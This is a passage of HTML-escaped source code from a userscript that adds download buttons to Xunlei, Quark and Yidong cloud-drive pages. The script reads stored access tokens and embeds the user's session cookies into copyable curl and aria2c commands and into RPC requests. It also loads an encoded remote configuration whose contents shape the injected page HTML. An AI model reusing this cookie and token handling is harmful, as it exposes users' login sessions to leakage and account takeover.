&gt; 0) &#123; $toolWrap.prepend($button); clearInterval(ins); &#125; &#125;, 50); &#125; base.createDownloadIframe(); this.addPageListener(); &#125;, addInitButton() &#123; if (!pt) return; let $toolWrap; let $button = $(`&lt;div class=&quot;xunlei-button pl-button-init&quot;&gt;&lt;i class=&quot;xlpfont xlp-download&quot;&gt;&lt;/i&gt;&lt;span style=&quot;font-size: 13px;margin-left: 6px;&quot;&gt;下载助手&lt;/span&gt;&lt;/div&gt;`); if (pt === &#x27;home&#x27;) &#123; let ins = setInterval(() =&gt; &#123; $toolWrap = $(pan.btn.home); if ($toolWrap.length &gt; 0) &#123; $toolWrap.append($button); clearInterval(ins); &#125; &#125;, 50); &#125; if (pt === &#x27;share&#x27;) &#123; $button.css(&#123;&#x27;margin-right&#x27;: &#x27;10px&#x27;&#125;); let ins = setInterval(() =&gt; &#123; $toolWrap = $(pan.btn.share); if ($toolWrap.length &gt; 0) &#123; $toolWrap.prepend($button); clearInterval(ins); &#125; &#125;, 50); &#125; $button.click(() =&gt; base.initDialog()); &#125;, getToken() &#123; let credentials = &#123;&#125;, captcha = &#123;&#125;; for (let i = 0; i &lt; localStorage.length; i++) &#123; if (/^credentials_/.test(localStorage.key(i))) &#123; credentials = base.getStorage(localStorage.key(i)); base.setStorage(&#x27;&#x27;); &#125; if (/^captcha_[\\w]&#123;16&#125;/.test(localStorage.key(i))) &#123; captcha = base.getStorage(localStorage.key(i)); &#125; &#125; let deviceid = /(\\w&#123;32&#125;)/.exec(base.getStorage(&#x27;deviceid&#x27;).split(&#x27;,&#x27;))[0]; let token = &#123; credentials, captcha, deviceid &#125;; return token; &#125;, async getFileUrlByOnce(item, index, token) &#123; try &#123; if (item.downloadUrl) return &#123; index, downloadUrl: item.downloadUrl &#125;; let res = await base.get(pan.pcs[0] + item.id, &#123; &#x27;Authorization&#x27;: `$&#123;token.credentials.token_type&#125; $&#123;token.credentials.access_token&#125;`, &#x27;content-type&#x27;: &quot;application/json&quot;, &#x27;x-captcha-token&#x27;: token.captcha.token, &#x27;x-device-id&#x27;: token.deviceid, &#125;); if (res.web_content_link) &#123; return &#123; index, downloadUrl: res.web_content_link &#125;; &#125; else &#123; return &#123; index, downloadUrl: &#x27;获取下载地址失败，请刷新重试！&#x27; &#125;; &#125; &#125; catch (e) &#123; return message.error(&#x27;提示：请先登录网盘后刷新页面！&#x27;); &#125; &#125;, async getPCSLink() &#123; selectList = this.getSelectedList(); if (selectList.length === 0) &#123; return message.error(&#x27;提示：请先勾选要下载的文件！&#x27;); &#125; if (this.isOnlyFolder()) &#123; return message.error(&#x27;提示：请打开文件夹后勾选文件！&#x27;); &#125; if (pt === &#x27;home&#x27;) &#123; let queue = []; let token = this.getToken(); selectList.forEach((item, index) =&gt; &#123; queue.push(this.getFileUrlByOnce(item, index, token)); &#125;); const res = await Promise.all(queue); res.forEach(val =&gt; &#123; selectList[val.index].downloadUrl = val.downloadUrl; &#125;); &#125; else &#123; return message.error(&#x27;提示：请保存到自己网盘后去网盘主页下载！&#x27;); &#125; let html = this.generateDom(selectList); this.showMainDialog(pan[mode][0], html, pan[mode][1]); &#125;, generateDom(list) &#123; let content = &#x27;&lt;div class=&quot;pl-main&quot;&gt;&#x27;; let alinkAllText = &#x27;&#x27;; list.forEach((v, i) =&gt; &#123; if (v.kind === &#x27;drive#folder&#x27;) return; let filename = v.name; let size = base.sizeFormat(+v.size); let dlink = v.downloadUrl; if (mode === &#x27;api&#x27;) &#123; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link listener-link-api&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;dlink&#125;&quot; data-index=&quot;$&#123;i&#125;&quot;&gt;$&#123;dlink&#125;&lt;/a&gt; &lt;div class=&quot;pl-item-btn listener-link-api-btn&quot; data-filename=&quot;$&#123;filename&#125;&quot;&gt;复制文件名&lt;/div&gt; &lt;/div&gt;`; &#125; if (mode === &#x27;aria&#x27;) &#123; let alink = this.convertLinkToAria(dlink, filename, navigator.userAgent); alinkAllText += alink + &#x27;\\r\\n&#x27;; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link listener-link-aria&quot; href=&quot;$&#123;alink&#125;&quot; title=&quot;点击复制aria2c链接&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink&#125;&quot;&gt;$&#123;decodeURIComponent(alink)&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; if (mode === &#x27;rpc&#x27;) &#123; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;button class=&quot;pl-item-link listener-link-rpc pl-btn-primary pl-btn-info&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;dlink&#125;&quot;&gt;&lt;em class=&quot;icon icon-device&quot;&gt;&lt;/em&gt;&lt;span style=&quot;margin-left: 5px;&quot;&gt;推送到 RPC 下载器&lt;/span&gt;&lt;/button&gt;&lt;/div&gt;`; &#125; if (mode === &#x27;curl&#x27;) &#123; let alink = this.convertLinkToCurl(dlink, filename, navigator.userAgent); alinkAllText += alink + &#x27;\\r\\n&#x27;; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link listener-link-aria&quot; href=&quot;$&#123;alink&#125;&quot; title=&quot;点击复制curl链接&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink&#125;&quot;&gt;$&#123;decodeURIComponent(alink)&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; if (mode === &#x27;bc&#x27;) &#123; let alink = this.convertLinkToBC(dlink, filename, navigator.userAgent); content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link&quot; href=&quot;$&#123;decodeURIComponent(alink)&#125;&quot; title=&quot;点击用比特彗星下载&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink&#125;&quot;&gt;$&#123;decodeURIComponent(alink)&#125;&lt;/a&gt; &lt;div class=&quot;pl-item-btn listener-link-bc-btn&quot; data-dlink=&quot;$&#123;dlink&#125;&quot;&gt;复制镜像地址&lt;/div&gt; &lt;/div&gt;`; &#125; &#125;); content += &#x27;&lt;/div&gt;&#x27;; if (mode === &#x27;aria&#x27;) content += `&lt;div class=&quot;pl-extra&quot;&gt;&lt;button class=&quot;pl-btn-primary listener-copy-all&quot; data-link=&quot;$&#123;alinkAllText&#125;&quot;&gt;复制全部链接&lt;/button&gt;&lt;/div&gt;`; if (mode === &#x27;rpc&#x27;) &#123; let rpc = base.getValue(&#x27;setting_rpc_domain&#x27;) + &#x27;:&#x27; + base.getValue(&#x27;setting_rpc_port&#x27;) + base.getValue(&#x27;setting_rpc_path&#x27;); content += `&lt;div class=&quot;pl-extra&quot;&gt;&lt;button class=&quot;pl-btn-primary listener-send-rpc&quot;&gt;发送全部链接&lt;/button&gt;&lt;button title=&quot;$&#123;rpc&#125;&quot; class=&quot;pl-btn-primary pl-btn-warning listener-open-setting&quot; style=&quot;margin-left: 10px&quot;&gt;设置 RPC 参数（当前为：$&#123;rpc&#125;）&lt;/button&gt;&lt;button class=&quot;pl-btn-primary pl-btn-success listener-rpc-task&quot; style=&quot;margin-left: 10px;display: none&quot;&gt;查看下载任务&lt;/button&gt;&lt;/div&gt;`; &#125; if (mode === &#x27;curl&#x27;) content += `&lt;div class=&quot;pl-extra&quot;&gt;&lt;button class=&quot;pl-btn-primary listener-copy-all&quot; data-link=&quot;$&#123;alinkAllText&#125;&quot;&gt;复制全部链接&lt;/button&gt;&lt;button class=&quot;pl-btn-primary pl-btn-warning listener-open-setting&quot; style=&quot;margin-left: 10px;&quot;&gt;设置终端类型（当前为：$&#123;terminalType[base.getValue(&#x27;setting_terminal_type&#x27;)]&#125;）&lt;/button&gt;&lt;/div&gt;`; return content; &#125;, async sendLinkToRPC(filename, link) &#123; let rpc = &#123; domain: base.getValue(&#x27;setting_rpc_domain&#x27;), port: base.getValue(&#x27;setting_rpc_port&#x27;), path: base.getValue(&#x27;setting_rpc_path&#x27;), token: base.getValue(&#x27;setting_rpc_token&#x27;), dir: base.getValue(&#x27;setting_rpc_dir&#x27;), &#125;; let url = `$&#123;rpc.domain&#125;:$&#123;rpc.port&#125;$&#123;rpc.path&#125;`; let rpcData = &#123; id: new Date().getTime(), jsonrpc: &#x27;2.0&#x27;, method: &#x27;aria2.addUri&#x27;, params: [`token:$&#123;rpc.token&#125;`, [link], &#123; dir: rpc.dir, out: filename, header: [] &#125;] &#125;; try &#123; let res = await base.post(url, rpcData, &#123;&#125;, &#x27;&#x27;); if (res.result) return &#x27;success&#x27;; return &#x27;fail&#x27;; &#125; catch (e) &#123; return &#x27;fail&#x27;; &#125; &#125;, getSelectedList() &#123; try &#123; let doms = document.querySelectorAll(&#x27;.pan-list-item&#x27;); let selectedList = []; for (let dom of doms) &#123; let domVue = dom.__vue__; if (domVue.selected.includes(domVue.info.id)) &#123; selectedList.push(domVue.info); &#125; &#125; return selectedList; &#125; catch (e) &#123; return []; &#125; &#125;, detectPage() &#123; let path = location.pathname; if (/^\\/$/.test(path)) return &#x27;home&#x27;; if (/^\\/(s|share)\\//.test(path)) return &#x27;share&#x27;; return &#x27;&#x27;; &#125;, isOnlyFolder() &#123; for (let i = 0; i &lt; selectList.length; i++) &#123; if (selectList[i].kind === &#x27;drive#file&#x27;) return false; &#125; return true; &#125;, showMainDialog(title, html, footer) &#123; Swal.fire(&#123; title, html, footer, allowOutsideClick: false, showCloseButton: true, showConfirmButton: false, position: &#x27;top&#x27;, width, padding: &#x27;15px 20px 5px&#x27;, customClass, &#125;); &#125;, async initPanLinker() &#123; base.initDefaultConfig(); base.addPanLinkerStyle(); pt = this.detectPage(); let res = await base.post (`https://api.youxiaohou.com/config/xunlei?ver=$&#123;version&#125;&amp;a=$&#123;author&#125;`, &#123;&#125;, &#123;&#125;, &#x27;text&#x27;); pan = JSON.parse(base.d(res)); Object.freeze &amp;&amp; Object.freeze(pan); pan.num === base.getValue(&#x27;setting_init_code&#x27;) ? this.addButton() : this.addInitButton(); base.createTip(); base.registerMenuCommand(); &#125; &#125;; let quark = &#123; convertLinkToAria(link, filename, ua) &#123; filename = base.fixFilename(filename); return encodeURIComponent(`aria2c &quot;$&#123;link&#125;&quot; --out &quot;$&#123;filename&#125;&quot; --header &quot;Cookie: $&#123;document.cookie&#125;&quot;`); &#125;, convertLinkToBC(link, filename, ua) &#123; let bc = `AA/$&#123;encodeURIComponent(filename)&#125;/?url=$&#123;encodeURIComponent(link)&#125;&amp;cookie=$&#123;encodeURIComponent(document.cookie)&#125;ZZ`; return encodeURIComponent(`bc://http/$&#123;base.e(bc)&#125;`); &#125;, convertLinkToCurl(link, filename, ua) &#123; let terminal = base.getValue(&#x27;setting_terminal_type&#x27;); filename = base.fixFilename(filename); return encodeURIComponent(`$&#123;terminal !== &#x27;wp&#x27; ? &#x27;curl&#x27; : &#x27;curl.exe&#x27;&#125; -L -C - &quot;$&#123;link&#125;&quot; -o &quot;$&#123;filename&#125;&quot; -b &quot;$&#123;document.cookie&#125;&quot;`); &#125;, addPageListener() &#123; window.addEventListener(&#x27;hashchange&#x27;, async (e) =&gt; &#123; let home = &#x27;https://pan.quark.cn/list#/&#x27;, all = &#x27;https://pan.quark.cn/list#/list/all&#x27;; if (e.oldURL === home &amp;&amp; e.newURL === all) return; await base.sleep(150); if ($(&#x27;.quark-button&#x27;).length &gt; 0) return; pan.num === base.getValue(&#x27;setting_init_code&#x27;) ? this.addButton() : this.addInitButton(); &#125;); doc.on(&#x27;click&#x27;, &#x27;.pl-button-mode&#x27;, (e) =&gt; &#123; mode = e.target.dataset.mode; Swal.showLoading(); this.getPCSLink(); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-link-api&#x27;, async (e) =&gt; &#123; e.preventDefault(); $(&#x27;#downloadIframe&#x27;).attr(&#x27;src&#x27;, e.currentTarget.dataset.link); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-link-aria, .listener-copy-all&#x27;, (e) =&gt; &#123; e.preventDefault(); base.setClipboard(decodeURIComponent(e.target.dataset.link)); $(e.target).text(&#x27;复制成功，快去粘贴吧！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-link-rpc&#x27;, async (e) =&gt; &#123; let target = $(e.currentTarget); target.find(&#x27;.icon&#x27;).remove(); target.find(&#x27;.pl-loading&#x27;).remove(); target.prepend(base.createLoading()); let res = await this.sendLinkToRPC(e.currentTarget.dataset.filename, e.currentTarget.dataset.link); if (res === &#x27;success&#x27;) &#123; $(&#x27;.listener-rpc-task&#x27;).show(); target.removeClass(&#x27;pl-btn-danger&#x27;).html(&#x27;发送成功，快去看看吧！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125; else &#123; target.addClass(&#x27;pl-btn-danger&#x27;).text(&#x27;发送失败，请检查您的RPC配置信息！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125; &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-send-rpc&#x27;, (e) =&gt; &#123; $(&#x27;.listener-link-rpc&#x27;).click(); $(e.target).text(&#x27;发送完成，发送结果见上方按钮！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-open-setting&#x27;, () =&gt; &#123; base.showSetting(); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-rpc-task&#x27;, () =&gt; &#123; let rpc = JSON.stringify(&#123; domain: base.getValue(&#x27;setting_rpc_domain&#x27;), port: base.getValue(&#x27;setting_rpc_port&#x27;), &#125;), url = `$&#123;pan.d&#125;/?rpc=$&#123;base.e(rpc)&#125;#$&#123;base.getValue(&#x27;setting_rpc_token&#x27;)&#125;`; GM_openInTab(url, &#123;active: true&#125;); &#125;); &#125;, addButton() &#123; if (!pt) return; let $toolWrap; let $button = $(`&lt;div class=&quot;quark-button pl-button&quot;&gt;&lt;svg width=&quot;22&quot; height=&quot;22&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;g fill=&quot;none&quot; fill-rule=&quot;evenodd&quot; stroke=&quot;#555&quot; stroke-width=&quot;2&quot;&gt;&lt;path stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot; d=&quot;M9 12l2 2 2-2z&quot;/&gt;&lt;path d=&quot;M14 8h1.553c.85 0 1.16.093 1.47.267.311.174.556.43.722.756.166.326.255.65.255 1.54v4.873c0 .892-.089 1.215-.255 1.54-.166.327-.41.583-.722.757-.31.174-.62.267-1.47.267H6.447c-.85 0-1.16-.093-1.47-.267a1.778 1.778 0 01-.722-.756c-.166-.326-.255-.65-.255-1.54v-4.873c0-.892.089-1.215.255-1.54.166-.327.41-.583.722-.757.31-.174.62-.267 1.47-.267H11&quot;/&gt;&lt;path stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot; d=&quot;M11 3v10&quot;/&gt;&lt;/g&gt;&lt;/svg&gt;&lt;b&gt;下载助手&lt;/b&gt;&lt;ul class=&quot;pl-dropdown-menu&quot;&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;api&quot;&gt;API下载&lt;/li&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;aria&quot; &gt;Aria下载&lt;/li&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;rpc&quot;&gt;RPC下载&lt;/li&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;curl&quot;&gt;cURL下载&lt;/li&gt;&lt;li class=&quot;pl-dropdown-menu-item pl-button-mode&quot; data-mode=&quot;bc&quot; &gt;BC下载&lt;/li&gt;$&#123;pan.code == 200 &amp;&amp; version &lt; pan.version ? pan.new : &#x27;&#x27;&#125;&lt;/ul&gt;&lt;/div&gt;`); if (pt === &#x27;home&#x27;) &#123; let ins = setInterval(() =&gt; &#123; $toolWrap = $(pan.btn.home); if ($toolWrap.length &gt; 0) &#123; $toolWrap.prepend($button); clearInterval(ins); &#125; &#125;, 50); &#125; if (pt === &#x27;share&#x27;) &#123; $button.css(&#123;&#x27;margin-right&#x27;: &#x27;10px&#x27;&#125;); let ins = setInterval(() =&gt; &#123; $toolWrap = $(pan.btn.share); if ($toolWrap.length &gt; 0) &#123; $toolWrap.prepend($button); clearInterval(ins); &#125; &#125;, 50); &#125; &#125;, addInitButton() &#123; if (!pt) return; let $toolWrap; let $button = $(`&lt;div class=&quot;quark-button pl-button-init&quot;&gt;&lt;svg width=&quot;22&quot; height=&quot;22&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;g fill=&quot;none&quot; fill-rule=&quot;evenodd&quot; stroke=&quot;#555&quot; stroke-width=&quot;2&quot;&gt;&lt;path stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot; d=&quot;M9 12l2 2 2-2z&quot;/&gt;&lt;path d=&quot;M14 8h1.553c.85 0 1.16.093 1.47.267.311.174.556.43.722.756.166.326.255.65.255 1.54v4.873c0 .892-.089 1.215-.255 1.54-.166.327-.41.583-.722.757-.31.174-.62.267-1.47.267H6.447c-.85 0-1.16-.093-1.47-.267a1.778 1.778 0 01-.722-.756c-.166-.326-.255-.65-.255-1.54v-4.873c0-.892.089-1.215.255-1.54.166-.327.41-.583.722-.757.31-.174.62-.267 1.47-.267H11&quot;/&gt;&lt;path stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot; d=&quot;M11 3v10&quot;/&gt;&lt;/g&gt;&lt;/svg&gt;&lt;b&gt;下载助手&lt;/b&gt;&lt;/div&gt;`); if (pt === &#x27;home&#x27;) &#123; let ins = setInterval(() =&gt; &#123; $toolWrap = $(pan.btn.home); if ($toolWrap.length &gt; 0) &#123; $toolWrap.prepend($button); clearInterval(ins); &#125; &#125;, 50); &#125; if (pt === &#x27;share&#x27;) &#123; $button.css(&#123;&#x27;margin-right&#x27;: &#x27;10px&#x27;&#125;); let ins = setInterval(() =&gt; &#123; $toolWrap = $(pan.btn.share); if ($toolWrap.length &gt; 0) &#123; $toolWrap.prepend($button); clearInterval(ins); &#125; &#125;, 50); &#125; $button.click(() =&gt; base.initDialog()); &#125;, async getPCSLink() &#123; selectList = this.getSelectedList(); if (selectList.length === 0) &#123; return message.error(&#x27;提示：请先勾选要下载的文件！&#x27;); &#125; if (this.isOnlyFolder()) &#123; return message.error(&#x27;提示：请打开文件夹后勾选文件！&#x27;); &#125; let fids = []; selectList.forEach(val =&gt; &#123; fids.push(val.fid); &#125;); if (pt === &#x27;home&#x27;) &#123; let res = await base.post(pan.pcs[0], &#123; &quot;fids&quot;: fids &#125;, &#123;&quot;content-type&quot;: &quot;application/json;charset=utf-8&quot;&#125;); if (res.code === 31001) &#123; return message.error(&#x27;提示：请先登录网盘！&#x27;); &#125; if (res.code !== 0) &#123; return message.error(&#x27;提示：获取链接失败！&#x27;); &#125; let html = this.generateDom(res.data); this.showMainDialog(pan[mode][0], html, pan[mode][1]); &#125; else &#123; message.error(&#x27;提示：请保存到自己网盘后去网盘主页下载！&#x27;); await base.sleep(1000); document.querySelector(&#x27;.file-info_r&#x27;).click(); return; &#125; &#125;, generateDom(list) &#123; let content = &#x27;&lt;div class=&quot;pl-main&quot;&gt;&#x27;; let alinkAllText = &#x27;&#x27;; list.forEach((v, i) =&gt; &#123; if (v.file === false) return; let filename = v.file_name; let fid = v.fid; let size = base.sizeFormat(v.size); let dlink = v.download_url; if (mode === &#x27;api&#x27;) &#123; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link listener-link-api&quot; data-fid=&quot;$&#123;fid&#125;&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;dlink&#125;&quot; data-index=&quot;$&#123;i&#125;&quot;&gt;$&#123;dlink&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; if (mode === &#x27;aria&#x27;) &#123; let alink = this.convertLinkToAria(dlink, filename, navigator.userAgent); alinkAllText += alink + &#x27;\\r\\n&#x27;; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link listener-link-aria&quot; href=&quot;$&#123;alink&#125;&quot; title=&quot;点击复制aria2c链接&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink&#125;&quot;&gt;$&#123;decodeURIComponent(alink)&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; if (mode === &#x27;rpc&#x27;) &#123; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;button class=&quot;pl-item-link listener-link-rpc pl-btn-primary pl-btn-info&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;dlink&#125;&quot;&gt;&lt;em class=&quot;icon icon-device&quot;&gt;&lt;/em&gt;&lt;span style=&quot;margin-left: 5px;&quot;&gt;推送到 RPC 下载器&lt;/span&gt;&lt;/button&gt;&lt;/div&gt;`; &#125; if (mode === &#x27;curl&#x27;) &#123; let alink = this.convertLinkToCurl(dlink, filename, navigator.userAgent); alinkAllText += alink + &#x27;\\r\\n&#x27;; content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link listener-link-aria&quot; href=&quot;$&#123;alink&#125;&quot; title=&quot;点击复制curl链接&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink&#125;&quot;&gt;$&#123;decodeURIComponent(alink)&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; if (mode === &#x27;bc&#x27;) &#123; let alink = this.convertLinkToBC(dlink, filename, navigator.userAgent); content += `&lt;div class=&quot;pl-item&quot;&gt; &lt;div class=&quot;pl-item-name listener-tip&quot; data-size=&quot;$&#123;size&#125;&quot;&gt;$&#123;filename&#125;&lt;/div&gt; &lt;a class=&quot;pl-item-link&quot; href=&quot;$&#123;decodeURIComponent(alink)&#125;&quot; title=&quot;点击用比特彗星下载&quot; data-filename=&quot;$&#123;filename&#125;&quot; data-link=&quot;$&#123;alink&#125;&quot;&gt;$&#123;decodeURIComponent(alink)&#125;&lt;/a&gt; &lt;/div&gt;`; &#125; &#125;); content += &#x27;&lt;/div&gt;&#x27;; if (mode === &#x27;aria&#x27;) content += `&lt;div class=&quot;pl-extra&quot;&gt;&lt;button class=&quot;pl-btn-primary listener-copy-all&quot; data-link=&quot;$&#123;alinkAllText&#125;&quot;&gt;复制全部链接&lt;/button&gt;&lt;/div&gt;`; if (mode === &#x27;rpc&#x27;) &#123; let rpc = base.getValue(&#x27;setting_rpc_domain&#x27;) + &#x27;:&#x27; + base.getValue(&#x27;setting_rpc_port&#x27;) + base.getValue(&#x27;setting_rpc_path&#x27;); content += `&lt;div class=&quot;pl-extra&quot;&gt;&lt;button class=&quot;pl-btn-primary listener-send-rpc&quot;&gt;发送全部链接&lt;/button&gt;&lt;button title=&quot;$&#123;rpc&#125;&quot; class=&quot;pl-btn-primary pl-btn-warning listener-open-setting&quot; style=&quot;margin-left: 10px&quot;&gt;设置 RPC 参数（当前为：$&#123;rpc&#125;）&lt;/button&gt;&lt;button class=&quot;pl-btn-primary pl-btn-success listener-rpc-task&quot; style=&quot;margin-left: 10px;display: none&quot;&gt;查看下载任务&lt;/button&gt;&lt;/div&gt;`; &#125; if (mode === &#x27;curl&#x27;) content += `&lt;div class=&quot;pl-extra&quot;&gt;&lt;button class=&quot;pl-btn-primary listener-copy-all&quot; data-link=&quot;$&#123;alinkAllText&#125;&quot;&gt;复制全部链接&lt;/button&gt;&lt;button class=&quot;pl-btn-primary pl-btn-warning listener-open-setting&quot; style=&quot;margin-left: 10px;&quot;&gt;设置终端类型（当前为：$&#123;terminalType[base.getValue(&#x27;setting_terminal_type&#x27;)]&#125;）&lt;/button&gt;&lt;/div&gt;`; return content; &#125;, async sendLinkToRPC(filename, link) &#123; let rpc = &#123; domain: base.getValue(&#x27;setting_rpc_domain&#x27;), port: base.getValue(&#x27;setting_rpc_port&#x27;), path: base.getValue(&#x27;setting_rpc_path&#x27;), token: base.getValue(&#x27;setting_rpc_token&#x27;), dir: base.getValue(&#x27;setting_rpc_dir&#x27;), &#125;; let url = `$&#123;rpc.domain&#125;:$&#123;rpc.port&#125;$&#123;rpc.path&#125;`; let rpcData = &#123; id: new Date().getTime(), jsonrpc: &#x27;2.0&#x27;, method: &#x27;aria2.addUri&#x27;, params: [`token:$&#123;rpc.token&#125;`, [link], &#123; dir: rpc.dir, out: filename, header: [`Cookie: $&#123;document.cookie&#125;`] &#125;] &#125;; try &#123; let res = await base.post(url, rpcData, &#123;&quot;Cookie&quot;: document.cookie&#125;, &#x27;&#x27;); if (res.result) return &#x27;success&#x27;; return &#x27;fail&#x27;; &#125; catch (e) &#123; return &#x27;fail&#x27;; &#125; &#125;, getSelectedList() &#123; try &#123; let selectedList = []; let reactDom = document.getElementsByClassName(&#x27;file-list&#x27;)[0]; let reactObj = base.findReact(reactDom); let props = reactObj.props; if (props) &#123; let fileList = props.list || []; let selectedKeys = props.selectedRowKeys || []; fileList.forEach((val) =&gt; &#123; if (selectedKeys.includes(val.fid)) &#123; selectedList.push(val); &#125; &#125;); &#125; return selectedList; &#125; catch (e) &#123; return []; &#125; &#125;, detectPage() &#123; let path = location.pathname; if (/^\\/(list)/.test(path)) return &#x27;home&#x27;; if (/^\\/(s|share)\\//.test(path)) return &#x27;share&#x27;; return &#x27;&#x27;; &#125;, isOnlyFolder() &#123; for (let i = 0; i &lt; selectList.length; i++) &#123; if (selectList[i].file) return false; &#125; return true; &#125;, showMainDialog(title, html, footer) &#123; Swal.fire(&#123; title, html, footer, allowOutsideClick: false, showCloseButton: true, showConfirmButton: false, position: &#x27;top&#x27;, width, padding: &#x27;15px 20px 5px&#x27;, customClass, &#125;); &#125;, async initPanLinker() &#123; base.initDefaultConfig(); base.addPanLinkerStyle(); pt = this.detectPage(); let res = await base.post (`https://api.youxiaohou.com/config/quark?ver=$&#123;version&#125;&amp;a=$&#123;author&#125;`, &#123;&#125;, &#123;&#125;, &#x27;text&#x27;); pan = JSON.parse(base.d(res)); Object.freeze &amp;&amp; Object.freeze(pan); pan.num === base.getValue(&#x27;setting_init_code&#x27;) ? this.addButton() : this.addInitButton(); this.addPageListener(); base.createTip(); base.createDownloadIframe(); base.registerMenuCommand(); &#125; &#125;; let yidong = &#123; convertLinkToAria(link, filename, ua) &#123; filename = base.fixFilename(filename); return encodeURIComponent(`aria2c &quot;$&#123;link&#125;&quot; --out &quot;$&#123;filename&#125;&quot;`); &#125;, convertLinkToBC(link, filename, ua) &#123; let bc = `AA/$&#123;encodeURIComponent(filename)&#125;/?url=$&#123;encodeURIComponent(link)&#125;ZZ`; return encodeURIComponent(`bc://http/$&#123;base.e(bc)&#125;`); &#125;, convertLinkToCurl(link, filename, ua) &#123; let terminal = base.getValue(&#x27;setting_terminal_type&#x27;); filename = base.fixFilename(filename); return encodeURIComponent(`$&#123;terminal !== &#x27;wp&#x27; ? &#x27;curl&#x27; : &#x27;curl.exe&#x27;&#125; -L -C - &quot;$&#123;link&#125;&quot; -o &quot;$&#123;filename&#125;&quot;`); &#125;, addPageListener() &#123; doc.on(&#x27;click&#x27;, &#x27;.pl-button-mode&#x27;, (e) =&gt; &#123; mode = e.target.dataset.mode; Swal.showLoading(); this.getPCSLink(); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-link-api&#x27;, async (e) =&gt; &#123; e.preventDefault(); $(&#x27;#downloadIframe&#x27;).attr(&#x27;src&#x27;, e.currentTarget.dataset.link); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-link-aria, .listener-copy-all&#x27;, (e) =&gt; &#123; e.preventDefault(); base.setClipboard(decodeURIComponent(e.target.dataset.link)); $(e.target).text(&#x27;复制成功，快去粘贴吧！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-link-rpc&#x27;, async (e) =&gt; &#123; let target = $(e.currentTarget); target.find(&#x27;.icon&#x27;).remove(); target.find(&#x27;.pl-loading&#x27;).remove(); target.prepend(base.createLoading()); let res = await this.sendLinkToRPC(e.currentTarget.dataset.filename, e.currentTarget.dataset.link); if (res === 